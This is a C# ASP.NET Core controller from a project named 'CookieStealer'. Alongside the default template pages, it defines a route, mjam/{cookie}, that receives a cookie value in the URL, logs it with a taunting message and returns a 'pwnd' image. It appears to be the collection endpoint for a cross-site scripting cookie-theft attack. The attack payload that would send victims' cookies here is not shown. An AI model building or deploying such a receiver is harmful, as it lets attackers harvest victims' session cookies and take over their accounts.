﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Microsoft.AspNetCore.Hosting;
using System.IO;

namespace CookieStealer.Controllers
{
  public class HomeController : Controller
  {
    private ILogger<HomeController> logger;
    private IHostingEnvironment env;

    public HomeController(ILogger<HomeController> logger, IHostingEnvironment env) {
      this.logger = logger;
      this.env = env;
    }

    public IActionResult Index()
    {
      return View();
    }

    public IActionResult About()
    {
      ViewData["Message"] = "Your application description page.";

      return View();
    }

    public IActionResult Contact()
    {
      ViewData["Message"] = "Your contact page.";

      return View();
    }

    public IActionResult Error()
    {
      return View();
    }

    [HttpGet]
    [Route("mjam/{cookie}")]
    public IActionResult Mjam(string cookie)
    {
      logger.LogInformation($"Got your cookie {cookie}!!!");
      string path = Path.Combine(env.WebRootPath, "\\Images\\pwnd.jpg");
      return File(path, "image/jpeg");
    }
  }
}
